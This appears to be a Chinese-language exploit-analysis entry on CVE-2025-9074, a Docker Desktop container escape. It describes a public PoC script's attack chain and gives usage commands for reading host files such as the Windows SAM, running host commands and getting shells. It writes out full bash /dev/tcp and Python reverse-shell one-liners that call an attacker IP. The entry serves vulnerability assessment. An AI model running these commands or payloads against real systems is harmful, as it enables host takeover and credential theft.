## CVE-2025-9074 - Docker Desktop for Windows/macOS 容器逃逸/权限提升

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 容器逃逸/权限提升

**影响应用:** Docker Desktop for Windows/macOS

**危害等级:** 高危

**CVSS评分:** 9.3

**影响版本:** Docker Desktop for Windows/macOS < 4.44.3

**利用条件:** 需要一个本地运行的恶意Linux容器，并通过默认子网访问Docker Engine API，无需额外认证。

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 5%

## 详情

该POC脚本 CVE-2025-9074-docker-exploit.py 是一个功能全面、设计精良的Python工具，旨在利用Docker Desktop中编号为CVE-2025-9074的容器逃逸漏洞。此漏洞的核心在于，在Windows或macOS系统上运行的恶意Linux容器能够意外地绕过其固有的隔离机制，并通过默认配置的内部子网（通常是192.168.65.7:2375）直接访问宿主机的Docker Engine API。关键点在于这种直接访问无需任何额外的认证或特殊的挂载点，使得一旦容器内部被攻破，攻击者便能获得一个特权接口来操控宿主机。脚本的整体有效性极高，能够将一个受限的容器环境完全升级为对整个宿主机的根级控制。

脚本通过一系列精巧的功能模块，实现了从初步侦察到深度利用的完整攻击链：
1.  **全面容器枚举与侦察**: 脚本首先能够通过向未受保护的Docker Engine API发送请求，获取宿主机上所有正在运行的Docker容器的详细列表。这包括容器ID、所使用的镜像、当前运行状态以及分配的名称。这一能力对于攻击者进行环境感知至关重要，它能帮助攻击者识别潜在的目标容器、了解宿主机的Docker生态，从而规划后续的攻击步骤。
2.  **实现任意宿主机文件读写**: 这是该漏洞最直接且最具破坏性的利用方式之一。脚本通过创建一个临时的、特权化的Docker容器，并巧妙地将宿主机的根文件系统（在Windows上通常是驱动器根目录，如C:\，在macOS/Linux上是/）以读写权限挂载到此临时容器内部。一旦宿主机的文件系统在容器内可用，攻击者便能读取任何敏感文件，例如窃取包含凭据的Windows SAM文件（C:\Windows\System32\config\SAM）、收集SSH私钥（~/.ssh/id_rsa）或访问/etc/shadow文件。同样，它也能向宿主机的任意位置写入文件，这意味着攻击者可以植入恶意程序、修改系统配置文件、创建新的用户账户，或者注入持久化后门，为后续的攻击活动铺平道路。
3.  **无限制宿主机命令执行**: 脚本能够利用上述文件挂载机制，在宿主机上实现任意命令执行，从而直接导致远程代码执行（RCE）。这通常通过在临时容器内执行命令来操作挂载的宿主机文件系统实现，例如，在宿主机的启动目录中放置一个可执行文件，或通过修改系统服务配置来启动恶意进程。这种能力赋予了攻击者在宿主机操作系统层面的完全控制权，可以执行任何系统命令，包括安装新软件、修改系统设置或删除关键数据。
4.  **稳健的反向Shell建立**: 作为后期利用的关键环节，脚本能够从被攻破的宿主机建立一个反向Shell连接到攻击者预先设置的监听服务器。脚本会创建一个配置特殊的临时容器，使其在宿主机上执行一段精心构造的Shell命令（例如基于netcat、bash -i >& /dev/tcp/IP/PORT 0>&1 或python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'）。一旦执行成功，宿主机的Shell输出将被重定向到攻击者的监听器，同时攻击者可以在其控制端向宿主机发送指令，从而获得一个稳定的、交互式的命令行访问，这对于深入渗透和权限维持至关重要。
5.  **提供交互式Shell**: 除了反向Shell，脚本还支持直接在攻击者当前运行的终端中建立与宿主机的交互式Shell。这提供了一个即时且高效的方式来执行命令，进行实时的文件系统浏览、进程管理和数据收集，极大地简化了渗透测试和漏洞验证流程。

值得注意的是，脚本中包含的normalize_host_path函数是一个非常实用的特性，它能够智能地处理Windows和macOS系统之间文件路径格式的差异（例如，将D:\temp转换为Docker容器内部可识别的/mnt/host/d/temp）。这一细节处理极大地增强了脚本的跨平台兼容性和实用性。结合argparse库提供的灵活命令行参数解析，使得该脚本不仅功能强大，而且用户友好，能够适应各种复杂的攻击场景。总而言之，CVE-2025-9074-docker-exploit.py是一个高度成熟且具有毁灭性潜力的漏洞利用工具，它能够彻底颠覆Docker Desktop的容器隔离边界，实现从容器到宿主机的完全接管。

**利用步骤**:
1.  **环境准备**: 确保目标系统运行着受影响版本的Docker Desktop (Windows或macOS < 4.44.3)。攻击者需要在已获得访问权限的本地Linux容器内执行操作。
2.  **下载POC**: 将 `CVE-2025-9074-docker-exploit.py` 脚本下载到攻击者控制的容器内部。
3.  **安装依赖**: 在容器内安装Python `docker` 库及其依赖 (`pip install docker websocket-client`)。
4.  **侦察容器**: 运行 `python3 CVE-2025-9074-docker-exploit.py -l` 或 `python3 CVE-2025-9074-docker-exploit.py --list-containers` 来列出宿主机上的所有Docker容器，确认Docker API可达。
5.  **执行宿主机命令**: 使用 `-c` 或 `--command` 参数在宿主机上执行任意命令，例如：
    - `python3 CVE-2025-9074-docker-exploit.py -c "whoami"` (获取当前用户)
    - `python3 CVE-2025-9074-docker-exploit.py -c "dir C:\"` (在Windows上列出C盘目录)
    - `python3 CVE-2025-9074-docker-exploit.py -c "ls -la /"` (在Linux/macOS上列出根目录)
6.  **读写宿主机文件**: 
    - 读取文件：`python3 CVE-2025-9074-docker-exploit.py -r C:\Windows\System32\config\SAM` (读取Windows SAM文件)
    - 写入文件：`python3 CVE-2025-9074-docker-exploit.py -w /tmp/evil.txt --data "This is evil"` (写入任意内容到宿主机文件)
7.  **建立反向Shell**: 
    - 在攻击者机器上设置一个监听器（例如 `nc -lvnp 4444`）。
    - 在容器内执行：`python3 CVE-2025-9074-docker-exploit.py --reverse-shell <攻击者IP> <监听端口>`，例如 `python3 CVE-2025-9074-docker-exploit.py --reverse-shell 10.0.0.1 4444`。
    - 成功后，攻击者将在监听器上获得宿主机的交互式Shell。
8.  **交互式Shell**: 使用 `-i` 或 `--interactive` 参数直接获取宿主机的交互式Shell：`python3 CVE-2025-9074-docker-exploit.py -i`。

**投毒风险分析**
该POC代码的投毒风险评估为**低**，具体评分为**5%**。经过详细的代码审查，我们没有发现任何恶意或可疑的投毒行为。

1.  **代码透明度与可读性**: 脚本采用Python编写，代码结构清晰、逻辑严谨，并包含详细的函数命名和代码注释。这使得代码非常透明，易于安全研究人员进行审计，快速理解其功能和潜在行为。代码中没有使用任何形式的混淆技术（如Base64编码、加密字符串或动态加载），所有功能都一目了然。
2.  **依赖项分析**: 脚本主要依赖于标准的Python库（如`os`, `sys`, `json`, `argparse`, `requests`, `socket`, `platform`, `threading`, `time`）以及一个明确声明的第三方库`docker`（用于与Docker Engine API交互）。`docker`库是一个广泛使用的、经过社区审查的合法库。脚本通过`check_dependencies`函数明确提示用户安装该库，而不是隐蔽地下载或执行未经授权的外部代码。所有依赖项都是出于实现漏洞利用的明确目的。
3.  **网络行为分析**: 脚本的网络请求行为是可预测且专注于漏洞利用的。其主要的网络通信目标是硬编码的Docker Engine API地址（`http://192.168.65.7:2375`），用于发送Docker API请求。在建立反向Shell时，脚本会连接到由攻击者明确指定的IP地址和端口。除此以外，代码中没有发现任何向未知或可疑的外部服务器发送数据、下载额外恶意负载、建立命令与控制（C2）通道或执行其他异常网络通信的行为。所有的网络活动都与脚本所宣称的漏洞利用功能完全一致。
4.  **恶意功能或后门植入**: 代码中没有包含任何非预期的恶意功能。例如，它不会植入持续性后门、启动加密货币挖矿程序、发起DDoS攻击、窃取敏感信息（除了通过文件读取功能暴露的宿主机敏感文件）或自动尝试进行横向移动或自我传播。脚本的核心设计目标是演示和实现CVE-2025-9074的利用，从而获得对宿主机的控制。
5.  **反向Shell的性质**: 脚本提供的反向Shell功能是漏洞利用链中的一个合法步骤，用于获取对受感染系统的交互式访问，它本身不是POC的“投毒”。它需要攻击者在本地设置监听器并提供目标IP和端口，通过执行宿主机上已有的标准工具（如`netcat`、`bash`、`python`）来建立连接，而非引入外部恶意二进制文件。这与偷偷植入一个无法被用户控制或发现的后门有着本质区别。

综上所述，该POC代码表现出高度的专业性和透明度，完全符合防御性安全研究工具的特点。它没有引入任何隐藏的恶意负载或意图，因此其作为投毒工具的风险极低。

**项目地址:** https://github.com/zenzue/CVE-2025-9074

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-9074
